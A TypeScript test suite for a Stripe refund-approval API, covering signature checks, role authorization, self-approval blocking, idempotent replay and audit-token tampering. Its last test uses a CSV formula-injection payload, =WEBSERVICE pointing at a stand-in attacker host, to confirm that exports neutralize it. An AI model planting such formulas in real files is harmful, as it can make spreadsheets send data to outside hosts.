import Stripe from "stripe";
import { beforeEach, describe, expect, it } from "vitest";

import {
  canonicalJson,
  serializeSignedEnvelope,
  type CanonicalJsonValue,
  type SignedEnvelope,
  type StripeRole,
} from "@refunddesk/contracts";
import type { AuditEvent } from "@refunddesk/db";

import { OPTIONS as contextSyncOptions } from "../app/api/v1/context/sync/route.js";
import {
  auditDownloadActorSnapshot,
  auditCsvResponse,
  isStoredStripeAdministrator,
  renderRedactedAuditCsv,
} from "../src/server/pilot-audit-download.js";
import { createPilotAuditToken, verifyPilotAuditToken } from "../src/server/pilot-audit-token.js";
import { TestAndSandboxAccessPolicy } from "../src/server/pilot-access-policy.js";
import { PilotApiError } from "../src/server/pilot-errors.js";
import { handlePilotRoute } from "../src/server/pilot-http.js";
import type {
  PilotExternalAlert,
  PilotMutation,
  PilotMutationMetadata,
  PilotMutationReceipt,
  PilotPage,
  PilotPayment,
  PilotPaymentReader,
  PilotPaymentResource,
  PilotRepository,
  PilotRequestRecord,
  PilotRequestSummary,
  PilotSettings,
  PilotSignedIdentity,
  PilotStoredResponse,
  PilotTenantContext,
} from "../src/server/pilot-ports.js";
import { PILOT_ROUTE_SPECS, type PilotRouteSpec } from "../src/server/pilot-routes.js";
import { PilotService } from "../src/server/pilot-service.js";

const SIGNING_SECRET = "absec_pilot_test";
const ACCOUNT_ID = "acct_pilot";
const USER_ID = "usr_approver";
const REQUEST_ID = "4c7080f7-4401-4c67-b96f-c9e80e8249d3";
const NONCE = "0e8e087d-5cf0-4c15-bb0d-020aa6e027c9";

function defaultContext(): PilotTenantContext {
  return {
    actor: {
      approverEnabled: true,
      id: "5950a897-6150-4372-8193-b3a9f2593c68",
      stripeUserId: USER_ID,
    },
    environment: "test",
    installationId: "bc401781-0027-4aa7-8bb4-d4a29fd5cce8",
    installationStatus: "active",
    stripeAccountId: ACCOUNT_ID,
    tenantId: "b4d99977-29d0-4493-a3bf-25b9719fb570",
    tenantStatus: "active",
  };
}

function defaultRequest(): PilotRequestRecord {
  return {
    amount_minor: "500",
    can_cancel: false,
    can_decide: true,
    charge_id: "ch_pilot",
    created_at: "2026-07-25T10:00:00.000Z",
    currency: "eur",
    id: REQUEST_ID,
    is_requester: false,
    justification: "Customer requested a partial refund.",
    payment_intent_id: "pi_pilot",
    reason: "requested_by_customer",
    requester_user_id: "usr_requester",
    resource_id: "pi_pilot",
    resource_type: "payment_intent",
    status: "pending_approval",
  };
}

class FakePilotRepository implements PilotRepository {
  context: PilotTenantContext | null = defaultContext();
  request: PilotRequestRecord | null = defaultRequest();
  activeRequest: {
    readonly can_cancel: boolean;
    readonly id: string;
    readonly status: "pending_approval";
  } | null = null;
  readonly alerts: PilotExternalAlert[] = [];
  readonly receipts = new Map<string, PilotMutationReceipt>();
  readonly resolvedIdentities: PilotSignedIdentity[] = [];
  readonly resolutionOptions: { readonly allowProvision: boolean }[] = [];
  executeError: Error | null = null;
  executeCount = 0;
  findCount = 0;
  storeCount = 0;

  resolveContext(
    identity: PilotSignedIdentity,
    options: { readonly allowProvision: boolean },
  ): Promise<PilotTenantContext | null> {
    this.resolvedIdentities.push(identity);
    this.resolutionOptions.push(options);
    return Promise.resolve(this.context);
  }

  findMutationReceipt(
    _context: PilotTenantContext,
    requestNonce: string,
  ): Promise<PilotMutationReceipt | null> {
    this.findCount += 1;
    return Promise.resolve(this.receipts.get(requestNonce) ?? null);
  }

  executeMutation(
    _context: PilotTenantContext,
    metadata: PilotMutationMetadata,
    mutation: PilotMutation,
  ): Promise<PilotStoredResponse> {
    this.executeCount += 1;
    if (this.executeError !== null) {
      return Promise.reject(this.executeError);
    }
    let result: PilotStoredResponse;
    switch (mutation.kind) {
      case "context_sync":
        result = {
          body: {
            approvals_required: 1,
            current_user_is_approver: true,
            installation_active: true,
            onboarding_completed: true,
          },
          status: 200,
        };
        break;
      case "refund_request_create":
        result = {
          body: {
            request_id: REQUEST_ID,
            status: "pending_approval",
          },
          status: 200,
        };
        break;
      case "refund_request_decide":
        result = {
          body: {
            request_id: mutation.requestId,
            status: mutation.decision === "approve" ? "approved" : "rejected",
          },
          status: 200,
        };
        break;
      case "refund_request_cancel":
        result = {
          body: { request_id: mutation.requestId, status: "canceled" },
          status: 200,
        };
        break;
      case "external_alert_acknowledge":
        result = {
          body: { acknowledged: true, alert_id: mutation.alertId },
          status: 200,
        };
        break;
      case "settings_update":
        result = {
          body: {
            approver_user_ids: mutation.approverUserIds,
            expiration_days: 7,
            onboarding_completed: mutation.onboardingCompleted,
          },
          status: 200,
        };
        break;
      case "audit_export":
        result = {
          body: {
            download_url: "https://refunddesk.example/api/v1/audit/download?token=test",
            expires_at: "2026-07-25T10:05:00.000Z",
          },
          status: 200,
        };
        break;
    }
    this.receipts.set(metadata.requestNonce, {
      actorId: metadata.actorId,
      canonicalRequestHash: metadata.canonicalRequestHash,
      operation: metadata.operation,
      response: result,
    });
    return Promise.resolve(result);
  }

  storeMutationReceipt(
    _context: PilotTenantContext,
    metadata: PilotMutationMetadata,
    response: PilotStoredResponse,
  ): Promise<PilotStoredResponse> {
    this.storeCount += 1;
    const existing = this.receipts.get(metadata.requestNonce);
    if (existing !== undefined) {
      if (
        existing.actorId !== metadata.actorId ||
        existing.operation !== metadata.operation ||
        !Buffer.from(existing.canonicalRequestHash).equals(
          Buffer.from(metadata.canonicalRequestHash),
        )
      ) {
        return Promise.reject(
          new PilotApiError(
            "IDEMPOTENCY_CONFLICT",
            409,
            "The request nonce was already used for a different mutation.",
          ),
        );
      }
      return Promise.resolve(existing.response);
    }
    this.receipts.set(metadata.requestNonce, {
      actorId: metadata.actorId,
      canonicalRequestHash: metadata.canonicalRequestHash,
      operation: metadata.operation,
      response,
    });
    return Promise.resolve(response);
  }

  findActiveRequest(): Promise<{
    readonly can_cancel: boolean;
    readonly id: string;
    readonly status: "pending_approval";
  } | null> {
    return Promise.resolve(this.activeRequest);
  }

  listRefundRequests(): Promise<PilotPage<PilotRequestSummary>> {
    return Promise.resolve({ items: [], next_cursor: null });
  }

  getRefundRequest(): Promise<PilotRequestRecord | null> {
    return Promise.resolve(this.request);
  }

  listExternalAlerts(): Promise<PilotPage<PilotExternalAlert>> {
    return Promise.resolve({ items: this.alerts, next_cursor: null });
  }

  getSettings(): Promise<PilotSettings> {
    return Promise.resolve({
      approver_user_ids: [USER_ID],
      expiration_days: 7,
      onboarding_completed: true,
    });
  }
}

class FakePaymentReader implements PilotPaymentReader {
  calls = 0;
  payment: PilotPayment = {
    amountCaptured: 1_000n,
    amountRefunded: 100n,
    captured: true,
    chargeId: "ch_pilot",
    currency: "eur",
    disputed: false,
    hasConnectSemantics: false,
    paid: true,
    paymentIntentId: "pi_pilot",
    paymentKey: "pi_pilot",
    paymentMethodType: "card",
  };

  retrievePayment(
    context: PilotTenantContext,
    resource: PilotPaymentResource,
  ): Promise<PilotPayment> {
    void context;
    void resource;
    this.calls += 1;
    return Promise.resolve(this.payment);
  }
}

interface SignedRequestOptions {
  readonly accountId?: string;
  readonly command?: CanonicalJsonValue;
  readonly commandJson?: string;
  readonly isSandbox?: boolean;
  readonly mode?: "live" | "test";
  readonly nonce?: string;
  readonly operation?: string;
  readonly path?: string;
  readonly resourceId?: string;
  readonly resourceType?: "account" | "charge" | "payment_intent";
  readonly roles?: StripeRole[];
  readonly rolesAsserted?: boolean;
  readonly signingSecret?: string;
  readonly userId?: string;
}

function signedRequest(spec: PilotRouteSpec, options: SignedRequestOptions = {}): Request {
  const accountId = options.accountId ?? ACCOUNT_ID;
  const resourceType =
    options.resourceType ?? (spec.resource === "account" ? "account" : "payment_intent");
  const base = {
    operation: options.operation ?? spec.operation,
    request_nonce: options.nonce ?? NONCE,
    mode: options.mode ?? "test",
    is_sandbox: options.isSandbox ?? false,
    command_json: options.commandJson ?? canonicalJson(options.command ?? {}),
    user_id: options.userId ?? USER_ID,
    account_id: accountId,
  } as const;
  const roleAssertion =
    options.rolesAsserted === false
      ? ({ roles_asserted: false } as const)
      : ({
          roles_asserted: true,
          stripe_roles: options.roles ?? [{ name: "Administrator", type: "builtIn" }],
        } as const);
  const envelope: SignedEnvelope =
    resourceType === "account"
      ? {
          ...base,
          resource_type: "account",
          ...roleAssertion,
        }
      : {
          ...base,
          resource_type: resourceType,
          resource_id: options.resourceId ?? (resourceType === "charge" ? "ch_pilot" : "pi_pilot"),
          ...roleAssertion,
        };
  const raw = serializeSignedEnvelope(envelope);
  const signature = Stripe.webhooks.generateTestHeaderString({
    payload: raw,
    secret: options.signingSecret ?? SIGNING_SECRET,
    timestamp: Math.floor(Date.now() / 1_000),
  });
  return new Request(`https://api.refunddesk.example${options.path ?? spec.path}`, {
    body: raw,
    headers: {
      "Content-Type": "application/json",
      "Stripe-Signature": signature,
    },
    method: "POST",
  });
}

async function errorBody(response: Response): Promise<Readonly<Record<string, unknown>>> {
  const value = (await response.json()) as unknown;
  if (typeof value !== "object" || value === null || Array.isArray(value)) {
    throw new TypeError("Expected an API error object");
  }
  return value as Readonly<Record<string, unknown>>;
}

describe("signed pilot API boundary", () => {
  let repository: FakePilotRepository;
  let paymentReader: FakePaymentReader;
  let service: PilotService;

  beforeEach(() => {
    repository = new FakePilotRepository();
    paymentReader = new FakePaymentReader();
    service = new PilotService(repository, paymentReader, new TestAndSandboxAccessPolicy());
  });

  async function invoke(
    spec: PilotRouteSpec,
    options: SignedRequestOptions = {},
  ): Promise<Response> {
    return handlePilotRoute(signedRequest(spec, options), spec, {
      service,
      signingSecret: SIGNING_SECRET,
    });
  }

  it("answers extension preflight requests without initializing a backend", () => {
    const response = contextSyncOptions();
    expect(response.status).toBe(204);
    expect(response.headers.get("access-control-allow-methods")).toBe("POST, OPTIONS");
    expect(response.headers.get("access-control-allow-headers")).toContain("Stripe-Signature");
  });

  it("verifies the raw signature before attempting to parse JSON", async () => {
    const raw = "{not-json";
    const signature = Stripe.webhooks.generateTestHeaderString({
      payload: raw,
      secret: "absec_wrong",
      timestamp: Math.floor(Date.now() / 1_000),
    });
    const response = await handlePilotRoute(
      new Request(`https://api.refunddesk.example${PILOT_ROUTE_SPECS.contextSync.path}`, {
        body: raw,
        headers: { "Stripe-Signature": signature },
        method: "POST",
      }),
      PILOT_ROUTE_SPECS.contextSync,
      { service, signingSecret: SIGNING_SECRET },
    );
    expect(response.status).toBe(401);
    expect(await errorBody(response)).toMatchObject({
      code: "SIGNATURE_INVALID",
    });
    expect(repository.resolutionOptions).toHaveLength(0);
  });

  it("rejects an exact route mismatch and query-string ambiguity", async () => {
    const wrongPath = await invoke(PILOT_ROUTE_SPECS.paymentEligibility, {
      path: "/api/v1/settings/get",
    });
    expect(wrongPath.status).toBe(400);
    expect(await errorBody(wrongPath)).toMatchObject({
      code: "ROUTE_MISMATCH",
    });

    const query = await invoke(PILOT_ROUTE_SPECS.paymentEligibility, {
      path: `${PILOT_ROUTE_SPECS.paymentEligibility.path}?unexpected=1`,
    });
    expect(query.status).toBe(400);
    expect(await errorBody(query)).toMatchObject({
      code: "ROUTE_MISMATCH",
    });
  });

  it("rejects an operation that does not exactly match its route", async () => {
    const response = await invoke(PILOT_ROUTE_SPECS.paymentEligibility, {
      operation: "settings.get",
    });
    expect(response.status).toBe(400);
    expect(await errorBody(response)).toMatchObject({
      code: "ROUTE_MISMATCH",
    });
  });

  it("denies live mode structurally before resolving a tenant", async () => {
    const response = await invoke(PILOT_ROUTE_SPECS.contextSync, {
      mode: "live",
    });
    expect(response.status).toBe(403);
    expect(await errorBody(response)).toMatchObject({
      code: "LIVE_MODE_DISABLED",
    });
    expect(repository.resolutionOptions).toHaveLength(0);
  });

  it("rejects account and payment resource mismatches", async () => {
    const accountResponse = await invoke(PILOT_ROUTE_SPECS.settingsGet, {
      resourceId: "pi_wrongscope",
      resourceType: "payment_intent",
    });
    expect(accountResponse.status).toBe(403);
    expect(await errorBody(accountResponse)).toMatchObject({
      code: "RESOURCE_MISMATCH",
    });

    const paymentResponse = await invoke(PILOT_ROUTE_SPECS.paymentEligibility, {
      resourceId: "ch_wrongprefix",
      resourceType: "payment_intent",
    });
    expect(paymentResponse.status).toBe(400);
    expect(await errorBody(paymentResponse)).toMatchObject({
      code: "RESOURCE_MISMATCH",
    });
  });

  it("exposes requester-bound cancellation capability on an active payment request", async () => {
    repository.activeRequest = {
      can_cancel: true,
      id: "8391fd67-2901-4b2f-8ad1-6fd3c08c39bb",
      status: "pending_approval",
    };

    const response = await invoke(PILOT_ROUTE_SPECS.paymentEligibility);

    expect(response.status).toBe(200);
    expect(await response.json()).toMatchObject({
      active_request: {
        can_cancel: true,
        id: "8391fd67-2901-4b2f-8ad1-6fd3c08c39bb",
        status: "pending_approval",
      },
    });
  });

  it("rejects non-canonical commands after signed-envelope verification", async () => {
    const response = await invoke(PILOT_ROUTE_SPECS.refundRequestList, {
      commandJson: '{"scope":"my_requests","limit":25}',
    });
    expect(response.status).toBe(400);
    expect(await errorBody(response)).toMatchObject({
      code: "ENVELOPE_NON_CANONICAL",
    });
  });

  it("rejects an account/environment context that differs from the signature", async () => {
    repository.context = {
      ...defaultContext(),
      stripeAccountId: "acct_other",
    };
    const accountResponse = await invoke(PILOT_ROUTE_SPECS.settingsGet);
    expect(accountResponse.status).toBe(403);
    expect(await errorBody(accountResponse)).toMatchObject({
      code: "ACCOUNT_ENVIRONMENT_MISMATCH",
    });

    repository.context = {
      ...defaultContext(),
      environment: "sandbox",
    };
    const environmentResponse = await invoke(PILOT_ROUTE_SPECS.settingsGet);
    expect(environmentResponse.status).toBe(403);
    expect(await errorBody(environmentResponse)).toMatchObject({
      code: "ACCOUNT_ENVIRONMENT_MISMATCH",
    });
  });

  it("requires the signed built-in Administrator role for settings changes", async () => {
    const command = {
      approver_user_ids: [USER_ID],
      expiration_days: 7,
      onboarding_completed: true,
    } as const;
    const customAdministrator = await invoke(PILOT_ROUTE_SPECS.settingsUpdate, {
      command,
      roles: [{ id: "super_admin", type: "custom", name: "Super Administrator" }],
    });
    expect(customAdministrator.status).toBe(403);
    expect(await errorBody(customAdministrator)).toMatchObject({
      code: "ADMIN_REQUIRED",
    });

    const unassertedAdministrator = await invoke(PILOT_ROUTE_SPECS.settingsUpdate, {
      command,
      nonce: "90d148d0-78ef-4cdc-aac2-3f4c854c26a1",
      rolesAsserted: false,
    });
    expect(unassertedAdministrator.status).toBe(403);
    expect(await errorBody(unassertedAdministrator)).toMatchObject({
      code: "ADMIN_REQUIRED",
    });

    const builtInAdministrator = await invoke(PILOT_ROUTE_SPECS.settingsUpdate, {
      command,
      nonce: "c1d21fd3-b011-42de-8e39-893b30a50315",
      roles: [{ id: "super_admin", type: "builtIn", name: "Super Administrator" }],
    });
    expect(builtInAdministrator.status).toBe(200);
    expect(repository.executeCount).toBe(1);
  });

  it("does not treat an Administrator as an explicit approver", async () => {
    repository.context = {
      ...defaultContext(),
      actor: {
        ...defaultContext().actor,
        approverEnabled: false,
      },
    };
    const response = await invoke(PILOT_ROUTE_SPECS.alertList, {
      command: { limit: 25 },
    });
    expect(response.status).toBe(403);
    expect(await errorBody(response)).toMatchObject({
      code: "APPROVER_REQUIRED",
    });
  });

  it("rejects a revoked approver before replaying an audit-export receipt", async () => {
    const options = {
      command: { format: "csv" },
      rolesAsserted: false,
    } as const;
    const first = await invoke(PILOT_ROUTE_SPECS.auditExport, options);
    expect(first.status).toBe(200);
    expect(repository.executeCount).toBe(1);
    expect(repository.findCount).toBe(1);
    expect(repository.receipts.size).toBe(1);

    repository.context = {
      ...defaultContext(),
      actor: {
        ...defaultContext().actor,
        approverEnabled: false,
      },
    };
    const replayAfterRevocation = await invoke(PILOT_ROUTE_SPECS.auditExport, options);

    expect(replayAfterRevocation.status).toBe(403);
    expect(await errorBody(replayAfterRevocation)).toMatchObject({
      code: "UNAUTHORIZED",
    });
    expect(repository.executeCount).toBe(1);
    expect(repository.findCount).toBe(1);
    expect(repository.storeCount).toBe(0);
    expect(repository.receipts.size).toBe(1);
  });

  it("keeps current-access denials outside mutation receipts", async () => {
    repository.context = {
      ...defaultContext(),
      actor: {
        ...defaultContext().actor,
        approverEnabled: false,
      },
    };

    const response = await invoke(PILOT_ROUTE_SPECS.alertAcknowledge, {
      command: { alert_id: "f890185d-11d4-4af8-a7c5-30aa96135aa2" },
      rolesAsserted: false,
    });

    expect(response.status).toBe(403);
    expect(await errorBody(response)).toMatchObject({
      code: "APPROVER_REQUIRED",
    });
    expect(repository.executeCount).toBe(0);
    expect(repository.findCount).toBe(0);
    expect(repository.storeCount).toBe(0);
    expect(repository.receipts.size).toBe(0);
  });

  it("preserves proof-replay classifications at the API boundary", async () => {
    repository.alerts.push({
      acknowledged: false,
      amount_minor: "500",
      classification: "proof_replay",
      currency: "eur",
      detected_at: "2026-07-25T10:00:00.000Z",
      id: "f890185d-11d4-4af8-a7c5-30aa96135aa2",
      refund_id: "re_copied_proof",
    });
    const response = await invoke(PILOT_ROUTE_SPECS.alertList, {
      command: { limit: 25 },
    });
    expect(response.status).toBe(200);
    expect(await response.json()).toMatchObject({
      items: [{ classification: "proof_replay" }],
    });
  });

  it("blocks self-approval using the immutable requester identity", async () => {
    repository.request = {
      ...defaultRequest(),
      is_requester: true,
      requester_user_id: USER_ID,
    };
    const response = await invoke(PILOT_ROUTE_SPECS.refundRequestDecide, {
      command: {
        decision: "approve",
        request_id: REQUEST_ID,
      },
    });
    expect(response.status).toBe(403);
    expect(await errorBody(response)).toMatchObject({
      code: "SELF_APPROVAL",
    });
    expect(repository.executeCount).toBe(0);
  });

  it("returns the requester and Stripe reason needed for an approval decision", async () => {
    const response = await invoke(PILOT_ROUTE_SPECS.refundRequestGet, {
      command: { request_id: REQUEST_ID },
    });

    expect(response.status).toBe(200);
    expect(await response.json()).toMatchObject({
      justification: "Customer requested a partial refund.",
      reason: "requested_by_customer",
      requester_user_id: "usr_requester",
    });
  });

  it("does not disclose request details to an unrelated non-approver", async () => {
    repository.context = {
      ...defaultContext(),
      actor: {
        ...defaultContext().actor,
        approverEnabled: false,
      },
    };
    repository.request = {
      ...defaultRequest(),
      can_decide: false,
      is_requester: false,
      justification: null,
    };

    const response = await invoke(PILOT_ROUTE_SPECS.refundRequestGet, {
      command: { request_id: REQUEST_ID },
    });
    expect(response.status).toBe(403);
    expect(await errorBody(response)).toMatchObject({
      code: "UNAUTHORIZED",
    });
  });

  it("replays a durable mutation receipt before any second Stripe read", async () => {
    const command = {
      amount_minor: "500",
      currency: "eur",
      justification: "Customer requested a partial refund.",
      reason: "requested_by_customer",
    } as const;
    const first = await invoke(PILOT_ROUTE_SPECS.refundRequestCreate, {
      command,
    });
    const firstBody = (await first.json()) as unknown;
    const replay = await invoke(PILOT_ROUTE_SPECS.refundRequestCreate, {
      command,
    });
    expect(replay.status).toBe(200);
    expect(await replay.json()).toEqual(firstBody);
    expect(paymentReader.calls).toBe(1);
    expect(repository.executeCount).toBe(1);

    const conflict = await invoke(PILOT_ROUTE_SPECS.refundRequestCreate, {
      command: { ...command, amount_minor: "400" },
    });
    expect(conflict.status).toBe(409);
    expect(await errorBody(conflict)).toMatchObject({
      code: "IDEMPOTENCY_CONFLICT",
    });
    expect(paymentReader.calls).toBe(1);
    expect(repository.executeCount).toBe(1);
  });

  it("durably replays an exact 422 response after payment eligibility changes", async () => {
    const command = {
      amount_minor: "5000",
      currency: "eur",
      justification: "Customer requested a refund.",
      reason: "requested_by_customer",
    } as const;
    const first = await invoke(PILOT_ROUTE_SPECS.refundRequestCreate, { command });
    expect(first.status).toBe(422);
    const firstBody = await errorBody(first);
    expect(firstBody).toMatchObject({
      code: "PAYMENT_NOT_ELIGIBLE",
      message: "The requested amount exceeds the remaining refundable balance.",
    });
    expect(typeof firstBody["request_id"]).toBe("string");
    expect(Object.keys(firstBody).sort()).toEqual(["code", "message", "request_id"]);
    expect(repository.storeCount).toBe(1);
    expect(repository.receipts.size).toBe(1);

    paymentReader.payment = {
      ...paymentReader.payment,
      amountCaptured: 10_000n,
    };
    const replay = await invoke(PILOT_ROUTE_SPECS.refundRequestCreate, { command });
    expect(replay.status).toBe(422);
    expect(await errorBody(replay)).toEqual(firstBody);
    expect(paymentReader.calls).toBe(1);
    expect(repository.executeCount).toBe(0);
    expect(repository.storeCount).toBe(1);
  });

  it("durably replays an exact 409 response after the workflow conflict clears", async () => {
    const command = {
      amount_minor: "500",
      currency: "eur",
      justification: "Customer requested a refund.",
      reason: "requested_by_customer",
    } as const;
    repository.activeRequest = {
      can_cancel: false,
      id: "8391fd67-2901-4b2f-8ad1-6fd3c08c39bb",
      status: "pending_approval",
    };
    const first = await invoke(PILOT_ROUTE_SPECS.refundRequestCreate, {
      command,
      nonce: "71054c05-dd50-498f-9541-1770061a8de8",
    });
    expect(first.status).toBe(409);
    const firstBody = await errorBody(first);
    expect(firstBody).toMatchObject({
      code: "WORKFLOW_CONFLICT",
      message: "A non-terminal refund request already exists for this payment.",
    });
    expect(typeof firstBody["request_id"]).toBe("string");
    expect(Object.keys(firstBody).sort()).toEqual(["code", "message", "request_id"]);
    expect(repository.storeCount).toBe(1);
    expect(repository.receipts.size).toBe(1);

    repository.activeRequest = null;
    const replay = await invoke(PILOT_ROUTE_SPECS.refundRequestCreate, {
      command,
      nonce: "71054c05-dd50-498f-9541-1770061a8de8",
    });
    expect(replay.status).toBe(409);
    expect(await errorBody(replay)).toEqual(firstBody);
    expect(paymentReader.calls).toBe(1);
    expect(repository.executeCount).toBe(0);
    expect(repository.storeCount).toBe(1);
  });

  it("does not persist or replay a 5xx mutation failure", async () => {
    repository.executeError = new PilotApiError(
      "INTERNAL_ERROR",
      500,
      "RefundDesk could not complete the request.",
    );
    const first = await invoke(PILOT_ROUTE_SPECS.contextSync);
    const retry = await invoke(PILOT_ROUTE_SPECS.contextSync);

    expect(first.status).toBe(500);
    expect(retry.status).toBe(500);
    expect(await errorBody(first)).toMatchObject({ code: "INTERNAL_ERROR" });
    expect(await errorBody(retry)).toMatchObject({ code: "INTERNAL_ERROR" });
    expect(repository.executeCount).toBe(2);
    expect(repository.storeCount).toBe(0);
    expect(repository.receipts.size).toBe(0);
  });

  it("allows only a built-in Administrator to provision context", async () => {
    repository.context = null;
    const unasserted = await invoke(PILOT_ROUTE_SPECS.contextSync, {
      rolesAsserted: false,
    });
    expect(unasserted.status).toBe(404);
    expect(repository.resolutionOptions).toEqual([{ allowProvision: false }]);
    expect(repository.resolvedIdentities[0]).toMatchObject({
      roles: [],
      rolesAsserted: false,
    });

    const nonAdmin = await invoke(PILOT_ROUTE_SPECS.contextSync, {
      nonce: "445198f4-ae73-46e7-83d4-88298826c182",
      roles: [{ name: "View only", type: "builtIn" }],
    });
    expect(nonAdmin.status).toBe(404);
    expect(repository.resolutionOptions).toEqual([
      { allowProvision: false },
      { allowProvision: false },
    ]);
    expect(repository.resolvedIdentities[1]).toMatchObject({
      roles: [{ name: "View only", type: "builtIn" }],
      rolesAsserted: true,
    });

    await invoke(PILOT_ROUTE_SPECS.contextSync, {
      nonce: "a63ed63a-b5be-4070-bf57-adcbe1cd6e5f",
      roles: [{ id: "super_admin", type: "builtIn", name: "Super Administrator" }],
    });
    expect(repository.resolutionOptions.at(-1)).toEqual({
      allowProvision: true,
    });
  });
});

describe("short-lived redacted audit exports", () => {
  const key = Buffer.alloc(32, 7);

  it("authorizes persisted built-in Administrator IDs and rejects custom homonyms", () => {
    expect(
      isStoredStripeAdministrator([
        { id: "super_admin", type: "builtIn", name: "Super Administrator" },
      ]),
    ).toBe(true);
    expect(
      isStoredStripeAdministrator([
        { id: "super_admin", type: "custom", name: "Super Administrator" },
      ]),
    ).toBe(false);
    expect(
      isStoredStripeAdministrator([
        { id: "view_only", type: "builtIn", name: "Super Administrator" },
      ]),
    ).toBe(false);
  });

  it("records the persisted authorization basis without copying stored roles", () => {
    expect(
      auditDownloadActorSnapshot(true, [{ id: "view_only", type: "builtIn", name: "View only" }]),
    ).toEqual({
      explicit_approver: true,
      stored_stripe_administrator: false,
    });
    expect(
      auditDownloadActorSnapshot(false, [
        { id: "super_admin", type: "builtIn", name: "Super Administrator" },
      ]),
    ).toEqual({
      explicit_approver: false,
      stored_stripe_administrator: true,
    });
  });

  it("rejects expired and tampered bearer tokens", () => {
    const valid = createPilotAuditToken(
      {
        actor_id: USER_ID,
        environment: "test",
        expires_at: "2026-07-25T10:05:00.000Z",
        installation_id: "bc401781-0027-4aa7-8bb4-d4a29fd5cce8",
        tenant_id: "b4d99977-29d0-4493-a3bf-25b9719fb570",
      },
      key,
    );
    expect(verifyPilotAuditToken(valid, key, new Date("2026-07-25T10:00:00.000Z"))).toMatchObject({
      actor_id: USER_ID,
      environment: "test",
    });

    const segments = valid.split(".");
    const payload = segments[1];
    if (payload === undefined) {
      throw new TypeError("Expected token payload");
    }
    const tamperedPayload = `${payload.slice(0, -1)}${payload.endsWith("A") ? "B" : "A"}`;
    expect(
      verifyPilotAuditToken(
        `v1.${tamperedPayload}.${segments[2] ?? ""}`,
        key,
        new Date("2026-07-25T10:00:00.000Z"),
      ),
    ).toBeNull();
    expect(verifyPilotAuditToken(valid, key, new Date("2026-07-25T10:05:00.000Z"))).toBeNull();
  });

  it("exports only redacted fields and neutralizes spreadsheet formulas", async () => {
    const event: AuditEvent = {
      action: '=WEBSERVICE("https://attacker.invalid")',
      actorId: USER_ID,
      actorSnapshot: { role: "secret snapshot" },
      actorType: "\tstripe_user",
      correlationRequestId: NONCE,
      entityId: REQUEST_ID,
      entityType: "\rrefund_request",
      id: "27ae15e3-94d0-4dbc-bc50-eac92b67dd1d",
      occurredAt: new Date("2026-07-25T10:00:00.000Z"),
      payload: { justification: "top secret justification" },
      schemaVersion: 1,
      tenantId: "b4d99977-29d0-4493-a3bf-25b9719fb570",
    };
    const csv = renderRedactedAuditCsv([event]);
    expect(csv).toContain(`"'=WEBSERVICE(""https://attacker.invalid"")"`);
    expect(csv).toContain(`"'\tstripe_user"`);
    expect(csv).toContain(`"'\rrefund_request"`);
    expect(csv).not.toContain("top secret justification");
    expect(csv).not.toContain("secret snapshot");

    const response = auditCsvResponse([event], new Date("2026-07-25T12:00:00.000Z"));
    expect(response.headers.get("cache-control")).toBe("no-store");
    expect(response.headers.get("content-disposition")).toBe(
      'attachment; filename="refunddesk-audit-2026-07-25.csv"',
    );
    expect(response.headers.get("content-type")).toBe("text/csv; charset=utf-8");
    expect(await response.text()).toBe(csv);
  });
});
